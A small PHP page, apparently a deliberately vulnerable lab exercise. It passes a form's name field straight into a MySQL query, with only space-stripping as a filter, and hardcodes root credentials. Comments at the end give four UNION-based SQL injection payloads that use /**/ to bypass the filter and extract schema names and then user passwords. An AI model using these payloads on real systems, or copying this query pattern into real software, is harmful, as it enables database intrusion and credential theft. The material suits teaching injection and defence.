<?php 
$servername = "localhost";
$username = "root";
$password = "password";
$dbname = "sp_project";

// Create connection
global $conn;
$conn = new mysqli($servername, $username, $password,$dbname);
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
    // collect value of input field
    $data = $_REQUEST['myName'];
 
    if (empty($data)) {
        echo "Ask for a name";
    } else {
        query($data, $conn);
    }
}

function query($myQuery, $connec){
	$newQuery = str_replace(' ', '', $myQuery);
	if($newQuery != $myQuery){
		echo "Note that no spaces are allowed :) <br>";
		echo "But don't worry... I'll remove them<br><br>";
	}
	$sql = "Select * from users where name = '"  . $newQuery."';";
	if (!$connec->query($sql)) {
		echo "Error in the query";
	}else{
		$res = $connec->query($sql);
		if ($res->num_rows > 0) {
		  // output data of each row
		  while($row = $res->fetch_assoc()) {
		    echo "<table><tr><th>Id</th><th>Name</th><th>Surname</th><tr><tr><td>" . $row["id"]. "</td><td> " . $row["Name"]. "</td><td>" . $row["Surname"]. "</td></tr></table><br>";
		  }
		} else {
		  echo "0 results";
		}
	}
}
// '/**/UNION/**/SELECT/**/NULL,/**/NULL,/**/schema_name,/**/NULL/**/from/**/INFORMATION_SCHEMA.SCHEMATA/**//**/#
// '/**/UNION/**/SELECT/**/NULL,/**//**/TABLE_NAME,TABLE_SCHEMA,/**/NULL/**/from/**/INFORMATION_SCHEMA.TABLES/**/where/**/table_schema='sp_project'/**/#
// '/**/UNION/**/select/**/COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,/**/NULL/**/from/**/INFORMATION_SCHEMA.COLUMNS/**/where/**/table_name='users'/**/#
// '/**/UNION/**/select/**/id,Name,Password,/**/NULL/**/from/**/users/**/#
?>

<!DOCTYPE html>
<html>
<head>
	<title>SP (Very) Secure Page</title>
	<style>
table, th, td {
  border: 1px solid black;
}
</style>
</head>
<body>

<p>Which user are you looking for ?</p><br>
<form action="filter.php" method="post">
	<input type="text" name="myName">
	<input type="submit">
</form>

</body>
</html>